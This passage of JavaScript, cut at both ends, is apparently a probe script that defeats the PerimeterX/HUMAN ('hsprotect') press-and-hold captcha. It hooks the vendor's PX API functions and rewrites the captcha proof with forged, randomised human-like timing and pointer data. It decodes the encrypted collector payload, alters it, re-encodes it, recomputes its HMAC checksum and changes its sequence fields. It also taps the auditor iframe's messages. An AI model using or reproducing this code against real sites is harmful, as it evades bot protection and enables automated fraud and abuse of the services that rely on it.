      return JSON.stringify(d["DzN+dUlTekE="]) !== before;
    } catch (_) {
      return false;
    }
  }

  function normalizeNaturalLongAuxTimingFields(d, e, duration, wi, ui, qs) {
    try {
      if (!d || typeof d !== "object") return false;
      const before = {
        p: d["PARNQnlrTHQ="],
        kv: safe(d["KVkYX2w2GWg="]),
        q: d["QABxRgZqcXQ="],
        k28: d["KVkYX28zG2o="],
        xq: d["XQUsAxhpKjU="],
        s3: d["S3sxMQ0YNQo="],
        bzt: d["Bzt2fUFRcw=="],
        gc: safe(d["GCgpLl1AKRw="])
      };
      const baseQs = Number.isFinite(Number(qs)) ? Number(qs) : Math.round(Date.now());
      const xq = Math.round(ui + 5);
      const pArn = Math.round(baseQs - xq - 2);
      d["PARNQnlrTHQ="] = pArn;
      d["KVkYX2w2GWg="] = [Math.round(pArn + e + 10 + Math.random() * 17)];
      if (Object.prototype.hasOwnProperty.call(d, "QABxRgZqcXQ=")) d["QABxRgZqcXQ="] = Math.round(5400 + Math.random() * 1200);
      if (Object.prototype.hasOwnProperty.call(d, "KVkYX28zG2o=")) d["KVkYX28zG2o="] = Math.round(3300 + Math.random() * 1000);
      if (Object.prototype.hasOwnProperty.call(d, "XQUsAxhpKjU=")) d["XQUsAxhpKjU="] = xq;
      // Natural success captures in this profile cluster around 5.7-5.9s here
      // (not 5550..5625; the old /10 made accelerated packets an obvious
      // outlier versus the accepted natural-hold trace).
      if (Object.prototype.hasOwnProperty.call(d, "Bzt2fUFRcw==")) d["Bzt2fUFRcw=="] = 5650 + Math.round(Math.random() * 3000) / 10;
      if (Object.prototype.hasOwnProperty.call(d, "S3sxMQ0YNQo=")) d["S3sxMQ0YNQo="] = Math.round(wi + 330 + Math.random() * 160);
      if (Array.isArray(d["GCgpLl1AKRw="])) d["GCgpLl1AKRw="] = ["#px-captcha", "BODY", ""];
      return JSON.stringify(before) !== JSON.stringify({
        p: d["PARNQnlrTHQ="],
        kv: safe(d["KVkYX2w2GWg="]),
        q: d["QABxRgZqcXQ="],
        k28: d["KVkYX28zG2o="],
        xq: d["XQUsAxhpKjU="],
        s3: d["S3sxMQ0YNQo="],
        bzt: d["Bzt2fUFRcw=="],
        gc: safe(d["GCgpLl1AKRw="])
      });
    } catch (_) {
      return false;
    }
  }

  function normalizePx1200Timing(args) {
    try {
      if (!AUTO_ACTIONS || !AUTO_ACTIONS.normalizePx1200Timing) return args;
      if (!args || !args.length || !args[1] || typeof args[1] !== "object") return args;
      const data = args[1];
      const before = {
        gc: safe(data["GCgpLl1AKRw="]),
        e: data["eEgJDj4mCD4="],
        wi: data["WiZrIB9LbBU="],
        ui: data["Ui5jKBREZxs="],
        z: safe(data["ZjoXPCNQGQw="]),
        p: data["PARNQnlrTHQ="],
        kv: safe(data["KVkYX2w2GWg="])
      };
      let e = Number(data["eEgJDj4mCD4="] || 0);
      if (!isFinite(e) || e < 0) e = 0;
      const oldE = e;
      const shortStyle = useShortNoU0ProofStyle("");
      const timingProfile = String((AUTO_ACTIONS && AUTO_ACTIONS.px1200TimingProfile) || "default");
      const naturalLong = timingProfile === "natural_long";
      if (naturalLong) {
        e = Math.round(17200 + Math.random() * 900);
        data["eEgJDj4mCD4="] = e;
      } else if (shortStyle) {
        if (e < 9300 || e > 10800) {
          e = Math.round(9600 + Math.random() * 950);
          data["eEgJDj4mCD4="] = e;
        }
      } else if (e < 1700 || e > 3400) {
        e = Math.round(1900 + Math.random() * 1350);
        data["eEgJDj4mCD4="] = e;
      }
      let duration = 0;
      try {
        if (Array.isArray(data["ZjoXPCNQGQw="])) duration = Number(data["ZjoXPCNQGQw="][0]);
      } catch (_) {}
      if (naturalLong) {
        duration = Math.round(9600 + Math.random() * 600);
      } else {
        duration = chooseNormalizedHoldDuration(duration, shortStyle);
      }
      data["ZjoXPCNQGQw="] = [duration];

      const wi = Math.round(e + duration + Math.round((Math.random() * 2 - 1) * 12));
      const upGap = naturalLong ? Math.round(55 + Math.random() * 30) : Math.round(24 + Math.random() * 18);
      const ui = wi + upGap;
      data["WiZrIB9LbBU="] = wi;
      data["Ui5jKBREZxs="] = ui;

      const nowEpoch = Math.round(Date.now());
      if (naturalLong) {
        normalizeNaturalLongAuxTimingFields(data, e, duration, wi, ui, data["QS07ZwRKPlU="] || nowEpoch);
      } else if (shortStyle) {
        normalizeShortNoU0AuxTimingFields(data, e, duration, wi, ui, data["QS07ZwRKPlU="] || nowEpoch);
      } else {
        data["PARNQnlrTHQ="] = nowEpoch - ui;
        data["KVkYX2w2GWg="] = [data["PARNQnlrTHQ="] + Math.round(e + upGap + Math.round((Math.random() * 2 - 1) * 8))];
      }
      if (!naturalLong && Array.isArray(data["GCgpLl1AKRw="])) {
        const filtered = data["GCgpLl1AKRw="].filter(x => String(x).toUpperCase() !== "BODY");
        if (filtered.length) data["GCgpLl1AKRw="] = filtered;
      }
      if (Array.isArray(data["DzN+dUlTekE="])) {
        const delta = e - oldE;
        data["DzN+dUlTekE="] = data["DzN+dUlTekE="]
          .filter(item => !(item && item.PX12343 === "click"))
          .map(item => {
            try {
              if (!item || typeof item !== "object") return item;
              if (item.PX12343 === "pointerup") item.PX11699 = wi;
              else if (Number.isFinite(Number(item.PX11699))) item.PX11699 = Math.max(0, Math.round(Number(item.PX11699) + delta));
            } catch (_) {}
            return item;
          });
        if (naturalLong) normalizeNaturalLongInteractionShape(data, e, wi);
        else if (shortStyle) normalizeShortNoU0InteractionShape(data, e, wi);
      }
      if (naturalLong) {
        try {
          if (Array.isArray(data["GUloT18mZ3U="])) data["GUloT18mZ3U="] = resampleCoordArray(data["GUloT18mZ3U="], 150, e - 15500, e - 11750);
          if (Array.isArray(data["JnpXfGMUUUc="])) data["JnpXfGMUUUc="] = resampleCoordArray(data["JnpXfGMUUUc="], 600, e - 15500, ui + 870);
        } catch (_) {}
      } else if (shortStyle) normalizeShortNoU0CoordArrays(data, e, wi, ui);
      push("px1200_timing_normalized", {
        before,
        after: {
          gc: safe(data["GCgpLl1AKRw="]),
          e: data["eEgJDj4mCD4="],
          wi: data["WiZrIB9LbBU="],
          ui: data["Ui5jKBREZxs="],
          z: safe(data["ZjoXPCNQGQw="]),
          p: data["PARNQnlrTHQ="],
          kv: safe(data["KVkYX2w2GWg="]),
          shortStyle,
          timingProfile
        }
      });
    } catch (e) {
      push("px1200_timing_normalize_error", { error: String(e && e.message || e) });
    }
    return args;
  }

  function jsonClone(value) {
    try { return JSON.parse(JSON.stringify(value)); } catch (_) { return value; }
  }

  try {
    window.addEventListener("message", ev => {
      try {
        const dump = ev && ev.data && ev.data.__pxProbeBodyDump;
        if (dump && (window.top === window || !window.top)) {
          rememberBodyDump(dump);
        }
        const rec = ev && ev.data && ev.data.__pxProbeEvent;
        if (!rec) return;
        state.events.push({ t: Date.now(), perf: now(), href: location.href, kind: "child_" + rec.kind, data: rec });
        if (state.events.length > MAX_EVENTS) state.events.splice(0, state.events.length - MAX_EVENTS);
        persistTop();
      } catch (_) {}
    });
  } catch (_) {}

  function pxHashKey(tag) {
    tag = String(tag || "YjIYfyxJHRR9");
    let e = 0;
    for (let i = 0; i < tag.length; i++) e = (31 * e + tag.charCodeAt(i)) % 2147483647;
    return (e % 900 + 100) % 128;
  }

  function decodeB64(s) {
    s = String(s || "");
    try {
      const raw = atob(s + "=".repeat((4 - s.length % 4) % 4));
      return raw;
    } catch (_) {
      return "";
    }
  }
  function decodeB64Utf8(s) {
    const raw = decodeB64(s);
    if (!raw) return "";
    try {
      let pct = "";
      for (let i = 0; i < raw.length; i++) {
        pct += "%" + ("00" + raw.charCodeAt(i).toString(16)).slice(-2);
      }
      return decodeURIComponent(pct);
    } catch (_) {}
    try { return decodeURIComponent(escape(raw)); } catch (_) {}
    return raw;
  }

  function decodeCommandBody(text, sentBody) {
    try {
      const obj = JSON.parse(text);
      const cmd = obj.do || obj.ob;
      if (!cmd || typeof cmd !== "string") return null;
      const params = new URLSearchParams(String(sentBody || ""));
      const tag = params.get("tag") || "YjIYfyxJHRR9";
      const key = pxHashKey(tag);
      const raw = decodeB64(cmd);
      let dec = "";
      for (let i = 0; i < raw.length; i++) dec += String.fromCharCode(raw.charCodeAt(i) ^ key);
      const commands = dec.split("~~~~").filter(Boolean).map(part => {
        const bits = part.split("|");
        return {
          id: bits[0],
          argc: Math.max(0, bits.length - 1),
          args: bits.slice(1, 8).map(boundedString),
          preview: boundedString(part)
        };
      });
      return { tag, decodedLen: dec.length, commands };
    } catch (e) {
      return { error: String(e && e.message || e) };
    }
  }

  function ownStringKeys(obj) {
    try {
      return Reflect.ownKeys(obj).filter(k => typeof k === "string");
    } catch (_) {
      try { return Object.getOwnPropertyNames(obj); } catch (_) {}
    }
    return [];
  }

  function pxFunctionKeys(obj) {
    try {
      return ownStringKeys(obj).filter(k => /^PX\d+$/.test(k) && typeof obj[k] === "function");
    } catch (_) {}
    return [];
  }

  function discoverNamespaces() {
    const out = [];
    const seen = new Set();
    function add(ns) {
      if (!ns || seen.has(ns)) return;
      seen.add(ns);
      out.push(ns);
    }
    try {
      for (const k of ownStringKeys(window)) {
        let obj = null;
        try { obj = window[k]; } catch (_) { continue; }
        if (!obj || (typeof obj !== "object" && typeof obj !== "function")) continue;
        // Older probes only looked at enumerable _PX* names. The current
        // hsprotect build often uses non-enumerable globals or a short PX
        // object, so also keep candidates that actually expose PX#### methods.
        const looksLikePxName = /^_?PX/i.test(k) || k === "PX" || /PXzC5j78di/i.test(k);
        const hasPxMethods = pxFunctionKeys(obj).length > 0;
        if (looksLikePxName || hasPxMethods) add(k);
      }
      if (pxFunctionKeys(window).length > 0) add("__window__");
    } catch (_) {}
    return out;
  }

  function wrapApiObject(ns, obj) {
    if (!obj || (typeof obj !== "object" && typeof obj !== "function")) return;
    for (const name of ownStringKeys(obj)) {
      if (!/^PX\d+$/.test(name)) continue;
      const fn = obj[name];
      if (typeof fn !== "function" || fn.__pxProbeWrapped) continue;
      try {
        const wrapped = function(...args) {
          if (name === "PX1200") {
            try { normalizePx1200Timing(args); } catch (_) {}
            try {
              if (args && args[1] && typeof args[1] === "object") {
                state.lastPx1200Proof = jsonClone(args[1]);
                state.lastPx1200ProofAt = Date.now();
                push("px1200_proof_cached", {
                  tag: args[0],
                  keys: Object.keys(args[1] || {}).length,
                  gc: safe(args[1]["GCgpLl1AKRw="]),
                  e: args[1]["eEgJDj4mCD4="],
                  wi: args[1]["WiZrIB9LbBU="],
                  z: safe(args[1]["ZjoXPCNQGQw="]),
                  ui: args[1]["Ui5jKBREZxs="],
                  hash: args[1]["Ew9iCVZkZD4="],
                  ageMs: 0
                });
              }
            } catch (e) {
              push("px1200_proof_cache_error", { error: String(e && e.message || e) });
            }
          }
          push("api_call", { ns, name, args });
          return fn.apply(this, args);
        };
        Object.defineProperty(wrapped, "__pxProbeWrapped", { value: true });
        Object.defineProperty(wrapped, "__pxProbeOriginal", { value: fn });
        obj[name] = wrapped;
        state.wrapped.push(`${ns}.${name}`);
        push("api_wrapped", { ns, name });
        scheduleAutoInvoke(ns, obj, name);
      } catch (e) {
        push("api_wrap_error", { ns, name, error: String(e && e.message || e) });
      }
    }
  }

  function scanApis() {
    try {
      const namespaces = discoverNamespaces();
      state.namespaces = namespaces.map(ns => {
        const obj = ns === "__window__" ? window : window[ns];
        const keys = obj && (typeof obj === "object" || typeof obj === "function")
          ? ownStringKeys(obj).filter(k => /^PX\d+$/.test(k)).sort()
          : [];
        wrapApiObject(ns, obj);
        return { ns, keys };
      });
    } catch (_) {}
  }
  scanApis();
  setInterval(scanApis, 80);

  try {
    const origDefineProperty = Object.defineProperty;
    if (!origDefineProperty.__pxProbeWrappedDefineProperty) {
      const wrappedDefineProperty = function(target, prop, descriptor) {
        const ret = origDefineProperty.apply(this, arguments);
        try {
          if (target === window && /^_?PX/i.test(String(prop || ""))) {
            push("window_define_property", { prop: String(prop) });
            setTimeout(scanApis, 0);
          }
        } catch (_) {}
        return ret;
      };
      origDefineProperty(wrappedDefineProperty, "__pxProbeWrappedDefineProperty", { value: true });
      Object.defineProperty = wrappedDefineProperty;
      push("define_property_hook_installed", {});
    }
  } catch (e) {
    push("define_property_hook_error", { error: String(e && e.message || e) });
  }

  function b64Utf8(s) {
    try { return btoa(unescape(encodeURIComponent(String(s || "")))); } catch (_) {}
    try { return btoa(String(s || "")); } catch (_) {}
    return "";
  }
  function xorString(s, key) {
    s = String(s || "");
    let out = "";
    for (let i = 0; i < s.length; i++) out += String.fromCharCode(s.charCodeAt(i) ^ key);
    return out;
  }
  function hiddenSidDigits(sid) {
    let out = "";
    sid = String(sid || "");
    for (let i = 0; i < sid.length; i++) {
      const cp = sid.codePointAt(i);
      if (cp > 0xffff) i++;
      if (cp >= 0xE0100 && cp <= 0xE01FF) out += String.fromCharCode(cp - 0xE0100);
    }
    return out;
  }
  function parseRawForm(body) {
    const out = {};
    const parts = String(body || "").split("&");
    for (const part of parts) {
      const p = part.indexOf("=");
      const k = p >= 0 ? part.slice(0, p) : part;
      const v = p >= 0 ? part.slice(p + 1) : "";
      if (k === "payload") out[k] = v;
      else {
        try { out[k] = decodeURIComponent(v.replace(/\+/g, " ")); } catch (_) { out[k] = v; }
      }
    }
    return out;
  }
  function insertionPositions(insertLen, originalLen, uuid) {
    const h = xorString(b64Utf8(uuid), 10);
    const d = [];
    let vmax = -1;
    for (let p = 0; p < insertLen; p++) {
      const m = Math.floor(p / h.length) + 1;
      const g = p >= h.length ? p % h.length : p;
      const y = h.charCodeAt(g) * h.charCodeAt(m);
      if (!Number.isNaN(y) && y > vmax) vmax = y;
    }
    for (let b = 0; b < insertLen; b++) {
      const I = Math.floor(b / h.length) + 1;
      const E = b % h.length;
      let S = h.charCodeAt(E) * h.charCodeAt(I);
      if (Number.isNaN(S)) S = 0;
      if (S >= originalLen) S = vmax ? Math.floor((S / vmax) * (originalLen - 1)) : 0;
      while (d.indexOf(S) >= 0) S += 1;
      d.push(S);
    }
    return d.sort((a, b) => a - b);
  }
  function stripPayloadNoise(payload, form) {
    const qi = hiddenSidDigits(form.sid) || "1604064986000";
    const inserted = xorString(b64Utf8(qi), 10);
    const positions = insertionPositions(inserted.length, payload.length - inserted.length, form.uuid || "");
    const remove = new Set(positions.map(p => p - 1));
    let out = "";
    for (let i = 0; i < payload.length; i++) if (!remove.has(i)) out += payload[i];
    return { stripped: out, qi, inserted };
  }
  function insertPayloadNoise(stripped, form, qi) {
    const inserted = xorString(b64Utf8(qi || "1604064986000"), 10);
    const positions = insertionPositions(inserted.length, stripped.length, form.uuid || "");
    let out = "";
    let cursor = 0;
    for (let u = 0; u < inserted.length; u++) {
      const cut = Math.max(0, positions[u] - u - 1);
      out += stripped.substring(cursor, cut) + inserted[u];
      cursor = cut;
    }
    return out + stripped.substring(cursor);
  }
  function pxUtf8(s) {
    return unescape(encodeURIComponent(String(s || "")));
  }
  function md5Add(x, y) {
    const lsw = (x & 0xffff) + (y & 0xffff);
    return (((x >> 16) + (y >> 16) + (lsw >> 16)) << 16) | (lsw & 0xffff);
  }
  function md5Rol(num, cnt) {
    return (num << cnt) | (num >>> (32 - cnt));
  }
  function md5C(q, a, b, x, s, t) {
    return md5Add(md5Rol(md5Add(md5Add(a, q), md5Add(x, t)), s), b);
  }
  function md5F(a, b, c, d, x, s, t) { return md5C((b & c) | ((~b) & d), a, b, x, s, t); }
  function md5G(a, b, c, d, x, s, t) { return md5C((b & d) | (c & (~d)), a, b, x, s, t); }
  function md5H(a, b, c, d, x, s, t) { return md5C(b ^ c ^ d, a, b, x, s, t); }
  function md5I(a, b, c, d, x, s, t) { return md5C(c ^ (b | (~d)), a, b, x, s, t); }
  function rstr2binl(input) {
    const output = Array((input.length >> 2) + 1).fill(0);
    for (let i = 0; i < input.length * 8; i += 8) {
      output[i >> 5] |= (input.charCodeAt(i / 8) & 0xff) << (i % 32);
    }
    return output;
  }
  function binl2rstr(input) {
    let output = "";
    for (let i = 0; i < input.length * 32; i += 8) {
      output += String.fromCharCode((input[i >> 5] >>> (i % 32)) & 0xff);
    }
    return output;
  }
  function binlMd5(x, len) {
    x[len >> 5] |= 0x80 << (len % 32);
    x[(((len + 64) >>> 9) << 4) + 14] = len;
    let a = 1732584193, b = -271733879, c = -1732584194, d = 271733878;
    for (let i = 0; i < x.length; i += 16) {
      const olda = a, oldb = b, oldc = c, oldd = d;
      a = md5F(a, b, c, d, x[i+0], 7, -680876936); d = md5F(d, a, b, c, x[i+1], 12, -389564586);
      c = md5F(c, d, a, b, x[i+2], 17, 606105819); b = md5F(b, c, d, a, x[i+3], 22, -1044525330);
      a = md5F(a, b, c, d, x[i+4], 7, -176418897); d = md5F(d, a, b, c, x[i+5], 12, 1200080426);
      c = md5F(c, d, a, b, x[i+6], 17, -1473231341); b = md5F(b, c, d, a, x[i+7], 22, -45705983);
      a = md5F(a, b, c, d, x[i+8], 7, 1770035416); d = md5F(d, a, b, c, x[i+9], 12, -1958414417);
      c = md5F(c, d, a, b, x[i+10], 17, -42063); b = md5F(b, c, d, a, x[i+11], 22, -1990404162);
      a = md5F(a, b, c, d, x[i+12], 7, 1804603682); d = md5F(d, a, b, c, x[i+13], 12, -40341101);
      c = md5F(c, d, a, b, x[i+14], 17, -1502002290); b = md5F(b, c, d, a, x[i+15], 22, 1236535329);
      a = md5G(a, b, c, d, x[i+1], 5, -165796510); d = md5G(d, a, b, c, x[i+6], 9, -1069501632);
      c = md5G(c, d, a, b, x[i+11], 14, 643717713); b = md5G(b, c, d, a, x[i+0], 20, -373897302);
      a = md5G(a, b, c, d, x[i+5], 5, -701558691); d = md5G(d, a, b, c, x[i+10], 9, 38016083);
      c = md5G(c, d, a, b, x[i+15], 14, -660478335); b = md5G(b, c, d, a, x[i+4], 20, -405537848);
      a = md5G(a, b, c, d, x[i+9], 5, 568446438); d = md5G(d, a, b, c, x[i+14], 9, -1019803690);
      c = md5G(c, d, a, b, x[i+3], 14, -187363961); b = md5G(b, c, d, a, x[i+8], 20, 1163531501);
      a = md5G(a, b, c, d, x[i+13], 5, -1444681467); d = md5G(d, a, b, c, x[i+2], 9, -51403784);
      c = md5G(c, d, a, b, x[i+7], 14, 1735328473); b = md5G(b, c, d, a, x[i+12], 20, -1926607734);
      a = md5H(a, b, c, d, x[i+5], 4, -378558); d = md5H(d, a, b, c, x[i+8], 11, -2022574463);
      c = md5H(c, d, a, b, x[i+11], 16, 1839030562); b = md5H(b, c, d, a, x[i+14], 23, -35309556);
      a = md5H(a, b, c, d, x[i+1], 4, -1530992060); d = md5H(d, a, b, c, x[i+4], 11, 1272893353);
      c = md5H(c, d, a, b, x[i+7], 16, -155497632); b = md5H(b, c, d, a, x[i+10], 23, -1094730640);
      a = md5H(a, b, c, d, x[i+13], 4, 681279174); d = md5H(d, a, b, c, x[i+0], 11, -358537222);
      c = md5H(c, d, a, b, x[i+3], 16, -722521979); b = md5H(b, c, d, a, x[i+6], 23, 76029189);
      a = md5H(a, b, c, d, x[i+9], 4, -640364487); d = md5H(d, a, b, c, x[i+12], 11, -421815835);
      c = md5H(c, d, a, b, x[i+15], 16, 530742520); b = md5H(b, c, d, a, x[i+2], 23, -995338651);
      a = md5I(a, b, c, d, x[i+0], 6, -198630844); d = md5I(d, a, b, c, x[i+7], 10, 1126891415);
      c = md5I(c, d, a, b, x[i+14], 15, -1416354905); b = md5I(b, c, d, a, x[i+5], 21, -57434055);
      a = md5I(a, b, c, d, x[i+12], 6, 1700485571); d = md5I(d, a, b, c, x[i+3], 10, -1894986606);
      c = md5I(c, d, a, b, x[i+10], 15, -1051523); b = md5I(b, c, d, a, x[i+1], 21, -2054922799);
      a = md5I(a, b, c, d, x[i+8], 6, 1873313359); d = md5I(d, a, b, c, x[i+15], 10, -30611744);
      c = md5I(c, d, a, b, x[i+6], 15, -1560198380); b = md5I(b, c, d, a, x[i+13], 21, 1309151649);
      a = md5I(a, b, c, d, x[i+4], 6, -145523070); d = md5I(d, a, b, c, x[i+11], 10, -1120210379);
      c = md5I(c, d, a, b, x[i+2], 15, 718787259); b = md5I(b, c, d, a, x[i+9], 21, -343485551);
      a = md5Add(a, olda); b = md5Add(b, oldb); c = md5Add(c, oldc); d = md5Add(d, oldd);
    }
    return [a, b, c, d];
  }
  function rstrMd5(s) { s = pxUtf8(s); return binl2rstr(binlMd5(rstr2binl(s), s.length * 8)); }
  function rstrHmacMd5(key, data) {
    key = pxUtf8(key); data = pxUtf8(data);
    let bkey = rstr2binl(key);
    if (bkey.length > 16) bkey = binlMd5(bkey, key.length * 8);
    const ipad = Array(16), opad = Array(16);
    for (let i = 0; i < 16; i++) {
      ipad[i] = (bkey[i] || 0) ^ 0x36363636;
      opad[i] = (bkey[i] || 0) ^ 0x5c5c5c5c;
    }
    const hash = binlMd5(ipad.concat(rstr2binl(data)), 512 + data.length * 8);
    return binl2rstr(binlMd5(opad.concat(hash), 512 + 128));
  }
  function rstr2hex(s) {
    const hex = "0123456789abcdef";
    let out = "";
    for (let i = 0; i < s.length; i++) {
      const c = s.charCodeAt(i);
      out += hex.charAt((c >>> 4) & 15) + hex.charAt(c & 15);
    }
    return out;
  }
  function pxPcFromJson(json, form) {
    const key = `${form.uuid || ""}:${form.tag || "YjIYfyxJHRR9"}:${form.ft || "369"}`;
    const digest = rstr2hex(rstrHmacMd5(key, json));
    let digits = "", rest = "";
    for (let i = 0; i < digest.length; i++) {
      const code = digest.charCodeAt(i);
      if (code >= 48 && code <= 57) digits += digest[i];
      else rest += String(code % 10);
    }
    const mixed = digits + rest;
    let pc = "";
    for (let i = 0; i < mixed.length; i += 2) pc += mixed[i];
    return pc;
  }
  function decodeCollectorPayload(body) {
    const form = parseRawForm(body);
    if (!form.payload || !form.uuid) return null;
    const strippedInfo = stripPayloadNoise(form.payload, form);
      const raw = decodeB64Utf8(strippedInfo.stripped);
      let json = "";
      for (let i = 0; i < raw.length; i++) json += String.fromCharCode(raw.charCodeAt(i) ^ 50);
    return { form, qi: strippedInfo.qi, events: JSON.parse(json) };
  }
  function encodeCollectorPayload(parsed, originalBody) {
    const json = JSON.stringify(parsed.events);
    const pc = pxPcFromJson(json, parsed.form);
    const encrypted = xorString(json, 50);
    const stripped = b64Utf8(encrypted);
    const payload = insertPayloadNoise(stripped, parsed.form, parsed.qi);
    let out = String(originalBody).replace(/(^|&)payload=[^&]*/, "$1payload=" + payload);
    if (/(^|&)pc=/.test(out)) out = out.replace(/(^|&)pc=[^&]*/, "$1pc=" + pc);
    else out += "&pc=" + pc;
    parsed.form.pc = pc;
    return out;
  }
  function setFormField(body, key, value) {
    try {
      const enc = encodeURIComponent(String(value));
      const re = new RegExp("(^|&)" + key.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") + "=[^&]*");
      if (re.test(String(body || ""))) return String(body || "").replace(re, "$1" + key + "=" + enc);
      return String(body || "") + "&" + key + "=" + enc;
    } catch (_) {
      return body;
    }
  }
  function bumpCollectorSeqFields(body, delta) {
    try {
      let out = String(body || "");
      const form = parseRawForm(out);
      const seq = Number(form.seq);
      const rsc = Number(form.rsc);
      if (Number.isFinite(seq)) out = setFormField(out, "seq", Math.max(0, Math.round(seq + delta)));
      if (Number.isFinite(rsc)) out = setFormField(out, "rsc", Math.max(0, Math.round(rsc + delta)));
      return out;
    } catch (_) {
      return body;
    }
  }
  function maybeApplySeqBump(body, qi) {
    try {
      state.seqBumpByQi = state.seqBumpByQi || {};
      const bump = state.seqBumpByQi[String(qi || "")];
      if (!bump) return body;
      const form = parseRawForm(body);
      const seq = Number(form.seq);
      if (!Number.isFinite(seq) || seq < Number(bump.fromSeq)) return body;
      const out = bumpCollectorSeqFields(body, Number(bump.delta || 1));
      if (out !== body) push("collector_seq_bumped", { qi: String(qi || ""), fromSeq: bump.fromSeq, oldSeq: form.seq, delta: bump.delta || 1 });
      return out;
    } catch (e) {
      push("collector_seq_bump_error", { qi, error: String(e && e.message || e) });
      return body;
    }
  }
  function collectorBodySeqInfo(body) {
    try {
      const form = parseRawForm(body || "");
      let qi = "";
      let tags = [];
      try {
        const parsed = decodeCollectorPayload(body || "");
        qi = String(parsed && parsed.qi || "");
        tags = (parsed && parsed.events || []).map(ev => ev && ev.t).filter(Boolean);
      } catch (_) {}
      return {
        qi,
        seq: Number(form.seq),
        rsc: Number(form.rsc),
        tags,
        form
      };
    } catch (_) {
      return { qi: "", seq: NaN, rsc: NaN, tags: [], form: {} };
    }
  }
  function rememberDelayedFinalSent(body, reason) {
    try {
      const info = collectorBodySeqInfo(body);
      if (!info.qi || !Number.isFinite(info.seq)) return null;
      if (info.tags.indexOf("PX561") < 0 || info.tags.indexOf("aRVTHy91Wio=") < 0) return null;
      state.lastDelayedFinalByQi = state.lastDelayedFinalByQi || {};
      state.lastDelayedFinalByQi[info.qi] = {
        seq: info.seq,
        rsc: info.rsc,
        reason: String(reason || ""),
        tags: info.tags,
        at: REAL_DATE_NOW()
      };
      push("xhr_delayed_final_sent_recorded", {
        qi: info.qi,
        seq: info.seq,
        rsc: info.rsc,
        reason,
        tags: info.tags
      });
      return info;
    } catch (e) {
      push("xhr_delayed_final_record_error", { error: String(e && e.message || e) });
      return null;
    }
  }
  function knpXorText(s, qi) {
    const key = (Number(qi || "1604064986000") || 0) % 256;
    s = String(s || "");
    let out = "";
    for (let i = 0; i < s.length; i++) out += String.fromCharCode(s.charCodeAt(i) ^ key);
    return out;
  }
  function installKnpMessagePortTap() {
    try {
      if (!window.MessagePort || !MessagePort.prototype || MessagePort.prototype.__pxProbeKnpPortTapped) return;
      const origPost = MessagePort.prototype.postMessage;
      if (typeof origPost !== "function") return;
      Object.defineProperty(MessagePort.prototype, "__pxProbeKnpPortTapped", { configurable: true, value: true });
      MessagePort.prototype.postMessage = function(data, transfer) {
        try {
          const href = String(location.href || "");
          if (/crcldu\.com\/bd\/sync\.html/i.test(href) && typeof data === "string") {
            const qi = String(location.hash || "").replace(/^#/, "") || "1604064986000";
            try {
              const decoded = knpXorText(atob(String(data || "")), qi);
              const obj = JSON.parse(decoded);
              if (obj && obj.en) {
                const readyPayload = {
                  __pxProbeKnpBrokerReady: {
                    qi,
                    data: {
                      "U0MpSRYgLHo=": obj,
                      "cR1LFzd8RSQ=": Date.now()
                    },
                    via: "messageport_tap"
                  }
                };
                try { parent && parent.postMessage(readyPayload, "*"); } catch (_) {}
                try { top && top.postMessage(readyPayload, "*"); } catch (_) {}
                push("knp_sandbox_port_ready_intercepted", {
                  qi,
                  hasEn: true,
                  mtr: obj && obj.mtr,
                  href: href.slice(0, 160)
                });
              }
            } catch (e) {
              push("knp_sandbox_port_tap_decode_error", {
                qi,
                error: String(e && e.message || e),
                len: String(data || "").length
              });
            }
          }
        } catch (_) {}
        if (arguments.length > 1) return origPost.call(this, data, transfer);
        return origPost.call(this, data);
      };
      push("knp_sandbox_port_tap_installed", {});
    } catch (e) {
      try { push("knp_sandbox_port_tap_install_error", { error: String(e && e.message || e) }); } catch (_) {}
    }
  }
  installKnpMessagePortTap();
  function rememberLastKnp(qi, data) {
    try {
      const sourceQi = String(qi || "");
      const previousQi = String(state.lastKnpQi || "");
      if (sourceQi === "1604064986000" && previousQi && previousQi !== "1604064986000") {
        state.bootstrapKnpData = jsonClone(data);
        state.bootstrapKnpQi = sourceQi;
        push("knp_sandbox_bootstrap_not_promoted", { sourceQi, previousQi });
        return;
      }
      state.lastKnpData = jsonClone(data);
      state.lastKnpQi = sourceQi;
    } catch (_) {
      state.lastKnpData = jsonClone(data);
      state.lastKnpQi = String(qi || "");
    }
  }
  function startKnpSandboxProbe(qi, force) {
    try {
      qi = String(qi || "1604064986000");
      state.knpByQi = state.knpByQi || {};
      state.knpStartedByQi = state.knpStartedByQi || {};
      if (state.knpByQi[qi]) return;
      if (state.knpStartedByQi[qi]) {
        if (!force) return;
        try {
          const cleanup = state.knpBrokerCleanupByQi && state.knpBrokerCleanupByQi[qi];
          if (typeof cleanup === "function") cleanup();
        } catch (_) {}
        try { delete state.knpStartedByQi[qi]; } catch (_) { state.knpStartedByQi[qi] = 0; }
        push("knp_sandbox_broker_force_restart", { qi });
      }
      state.knpStartedByQi[qi] = REAL_DATE_NOW();
      const parent = document.body || document.documentElement;
      if (!parent) {
        REAL_SET_TIMEOUT(() => {
          try {
            state.knpStartedByQi[qi] = 0;
            startKnpSandboxProbe(qi);
          } catch (_) {}
        }, 250);
        return;
      }
      if (!AUTO_ACTIONS || AUTO_ACTIONS.knpUseCleanBroker !== false) {
        try {
          state.knpBrokerCleanupByQi = state.knpBrokerCleanupByQi || {};
          const form = parseRawForm(state.lastCollectorBody || "");
          const cfg = {
            qi,
            uuid: (state.knpMetaByQi && state.knpMetaByQi[qi] && state.knpMetaByQi[qi].uuid) || form.uuid || "",
            appId: (state.knpMetaByQi && state.knpMetaByQi[qi] && state.knpMetaByQi[qi].appId) || form.appId || "PXzC5j78di",
            // Match hsprotect main.min.js _p(): the auditor message carries
            // uu, captured as the *current* document href.  Earlier probes
            // stripped ch_ctx=1 here to collapse top/challenge contexts, but
            // fresh final Knp is generated from the ch_ctx frame.  Removing the
            // flag makes the crcldu auditor see a different caller context and
            // current-qi probes frequently time out.
            href: String(location.href || ""),
            version: 600000 * Math.floor(REAL_DATE_NOW() / 600000)
          };
          const broker = document.createElement("iframe");
          broker.setAttribute("aria-hidden", "true");
          broker.setAttribute("sandbox", "allow-scripts");
          broker.style.cssText = "position:absolute;visibility:hidden;pointer-events:none;border:0;top:0;left:0;width:120px;height:120px;";
          const brokerMain = function(cfg) {
            function send(kind, data) {
              try { parent.postMessage({ __pxProbeKnpBrokerLog: { qi: cfg.qi, kind: kind, data: data || null } }, "*"); } catch (_) {}
            }
            function xorText(s) {
              const key = (Number(cfg.qi || "1604064986000") || 0) % 256;
              s = String(s || "");
              let out = "";
